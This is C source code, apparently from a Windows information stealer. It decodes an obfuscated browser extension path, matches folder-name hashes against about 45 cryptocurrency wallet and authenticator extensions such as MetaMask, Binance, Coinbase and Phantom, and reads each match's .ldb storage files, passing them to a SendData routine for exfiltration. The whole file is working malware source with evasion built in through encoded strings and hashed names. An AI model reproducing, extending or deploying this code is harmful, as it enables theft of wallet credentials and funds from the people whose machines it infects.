#include "../include/ExtensionsGrabber.h"
#include "../include/DirectoryOps.h"
#include "../include/MemoryUtils.h"
#include "../include/StringUtils.h"
#include "../include/hashing.h"
#include "../include/PathOps.h"
#include "../include/macros.h"
#include "../include/ntdll.h"
#include "../include/SendData.h"
#include "../include/FileIO.h"
#include "../include/decoding.h"

#include <windows.h>


void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned short *ExtentionMark) {
    unsigned short      TempPath[250]       = {0};
    unsigned char       *FolderItems        = NULL;
    int                 PathSize            =  lenW(path);

    FolderItems = AllocMemory((SIZE_T)4096);
    if (FolderItems == NULL) {
        return;
    }

    MovMemory(path, TempPath, PathSize * 2);
    ConcatStringW(TempPath, L"\\", PathSize);
    ConcatStringW(TempPath, FolderName, PathSize + 1);

    if (ReadFolder(FolderItems, TempPath) != 0) {
        return;
    }

    PFILE_DIRECTORY_INFORMATION FileInfo = (PFILE_DIRECTORY_INFORMATION)FolderItems;

    while (TRUE) {
        unsigned short FileName[10];

        MovMemory(FileInfo->FileName, FileName, 20);
        FileName[10] = 0x0000;
        /* FileInfo->EndOfFile has buffer size */
        if (FileName[7] == 'l' && FileName[8] == 'd' && FileName[9] == 'b') {
            UNICODE_STRING      PathUnicode         = {0};
            OBJECT_ATTRIBUTES   PathObj             = {0};
            HANDLE              FileHandle          = {0};
            char                FileSizeString[20]  = {0};
            unsigned char      *buffer              = {0};
            int                 FileSize            = 0;
            int                 FullBufferSize      = 0;
            unsigned short      FileAndPath[250]    = {0};
            unsigned short      FullFileName[15]    = {0};
            char                FileNameC[15]       = {0};
            int                 TempPathSize        = lenW(TempPath);


            ConcatStringW(FullFileName, ExtentionMark, 0);
            ConcatStringW(FullFileName, FileName, 2);

            MovMemory(TempPath, FileAndPath, TempPathSize * 2);

            ConcatStringW(FileAndPath, L"\\", TempPathSize);
            ConcatStringW(FileAndPath, FileName, TempPathSize + 1);

            InitPathObj(FileAndPath, &PathObj, &PathUnicode);
            OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN);

            WideToNormal(FileNameC, FullFileName);
            FileSize = GetFileSizeY(FileHandle);
            FullBufferSize = TotalBufferLength(FullFileName, FileSize);

            buffer = AllocMemory((SIZE_T)FullBufferSize);
            if (buffer == NULL) {
                return;
            }

            IntToString(FileSizeString, FileSize);

            SendData(FileHandle, FileNameC, FileSize, FileSizeString, buffer, NULL, TRUE);
        }

        if (FileInfo->NextEntryOffset == 0) {
            break;
        }
        FileInfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)FileInfo + FileInfo->NextEntryOffset);
    }

    FreeMemory(FolderItems);
}


int GrabExtensions(unsigned short *path) {
    unsigned short      TempPath[250]       = {0};
    unsigned short      ExtentionsPath[34]  = {0x0061, 0x009b, 0x0078, 0x00b8, 0x0075, 0x00c2, 0x0094, 0x00b8, 0x008c, 0x0078, 0x008f, 0x00b2, 0x0075, 0x00b9, 0x003f, 0x0046, 0x00bc, 0x00a8, 0x00a5, 0x0093, 0x00bc, 0x0093, 0x00ae, 0x009e, 0x005e, 0x0071, 0x009a, 0x00a4, 0x00b8, 0x0099, 0x00a7, 0x009c, 0x00a5, 0x0000};
    unsigned char       *FolderItems        = NULL;
    int                 PathSize            =  lenW(path);

    FolderItems = AllocMemory((SIZE_T)4096);
    if (FolderItems == NULL) {
        return 100;
    }

    DecodeStringW(ExtentionsPath);
    MovMemory(path, TempPath, PathSize * 2);
    ConcatStringW(TempPath, ExtentionsPath, PathSize);


    if (ReadFolder(FolderItems, TempPath) != 0) {
        return 10;
    }

    PFILE_DIRECTORY_INFORMATION FileInfo = (PFILE_DIRECTORY_INFORMATION)FolderItems;

    while (TRUE) {
        unsigned short FolderName[100] = {0};

        /*we move 64 because a valid extention folder is 32 and we have to multiply it by 2 since its wide character array*/
        MovMemory(FileInfo->FileName, FolderName, 64);
        FolderName[32] = 0x0000;

        if (FileInfo->FileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
            switch (HashStrW(FolderName)) {
            case METAMASK:
                PrepareForSend(TempPath, FolderName, L"a\\");
                break;
            case METAMASK2:
                PrepareForSend(TempPath, FolderName, L"b\\");
                break;
            case BINANCE:
                PrepareForSend(TempPath, FolderName, L"c\\");
                break;
            case COINBASE:
                PrepareForSend(TempPath, FolderName, L"d\\");
                break;
            case RONIN:
                PrepareForSend(TempPath, FolderName, L"e\\");
                break;
            case TRUST:
                PrepareForSend(TempPath, FolderName, L"f\\");
                break;
            case VENOM:
                PrepareForSend(TempPath, FolderName, L"g\\");
                break;
            case SUI:
                PrepareForSend(TempPath, FolderName, L"h\\");
                break;
            case MARTIAN:
                PrepareForSend(TempPath, FolderName, L"i\\");
                break;
            case TRON:
                PrepareForSend(TempPath, FolderName, L"j\\");
                break;
            case PETRA:
                PrepareForSend(TempPath, FolderName, L"k\\");
                break;
            case PONTEM:
                PrepareForSend(TempPath, FolderName, L"l\\");
                break;
            case FEWCHA:
                PrepareForSend(TempPath, FolderName, L"m\\");
                break;
            case MATH:
                PrepareForSend(TempPath, FolderName, L"n\\");
                break;
            case COIN98:
                PrepareForSend(TempPath, FolderName, L"o\\");
                break;
            case AUTHENTICATOR:
                PrepareForSend(TempPath, FolderName, L"p\\");
                break;
            case EXODUSWEB3:
                PrepareForSend(TempPath, FolderName, L"q\\");
                break;
            case PHANTOM:
                PrepareForSend(TempPath, FolderName, L"r\\");
                break;
            case CORE:
                PrepareForSend(TempPath, FolderName, L"s\\");
                break;
            case TOKENPOCKET:
                PrepareForSend(TempPath, FolderName, L"t\\");
                break;
            case SAFEPAL:
                PrepareForSend(TempPath, FolderName, L"u\\");
                break;
            case SOLFARE:
                PrepareForSend(TempPath, FolderName, L"v\\");
                break;
            case KAIKAS:
                PrepareForSend(TempPath, FolderName, L"w\\");
                break;
            case IWALLET:
                PrepareForSend(TempPath, FolderName, L"x\\");
                break;
            case YOROI:
                PrepareForSend(TempPath, FolderName, L"y\\");
                break;
            case GUARDA:
                PrepareForSend(TempPath, FolderName, L"z\\");
                break;
            case JAXX_LIBERTY:
                PrepareForSend(TempPath, FolderName, L"A\\");
                break;
            case WOMBAT:
                PrepareForSend(TempPath, FolderName, L"B\\");
                break;
            case OXYGEN:
                PrepareForSend(TempPath, FolderName, L"C\\");
                break;
            case MEWCX:
                PrepareForSend(TempPath, FolderName, L"D\\");
                break;
            case GUILD:
                PrepareForSend(TempPath, FolderName, L"E\\");
                break;
            case SATURN:
                PrepareForSend(TempPath, FolderName, L"F\\");
                break;
            case TERRASTATION:
                PrepareForSend(TempPath, FolderName, L"G\\");
                break;
            case HARMONYOUTDATED:
                PrepareForSend(TempPath, FolderName, L"H\\");
                break;
            case EVER:
                PrepareForSend(TempPath, FolderName, L"I\\");
                break;
            case KARDIACHAIN:
                PrepareForSend(TempPath, FolderName, L"J\\");
                break;
            case PALIWALLET:
                PrepareForSend(TempPath, FolderName, L"K\\");
                break;
            case BOLTX:
                PrepareForSend(TempPath, FolderName, L"L\\");
                break;
            case LIQUALITY:
                PrepareForSend(TempPath, FolderName, L"M\\");
                break;
            case XDEFI:
                PrepareForSend(TempPath, FolderName, L"N\\");
                break;
            case NAMI:
                PrepareForSend(TempPath, FolderName, L"O\\");
                break;
            case MAIARDEFI:
                PrepareForSend(TempPath, FolderName, L"P\\");
                break;
            case TEMPLETEZOS:
                PrepareForSend(TempPath, FolderName, L"Q\\");
                break;
            case XMR_PT:
                PrepareForSend(TempPath, FolderName, L"R\\");
                break;
            }
        }

        if (FileInfo->NextEntryOffset == 0) {
            break;
        }

        FileInfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)FileInfo + FileInfo->NextEntryOffset);
    }

    FreeMemory(FolderItems);
    return 0;
}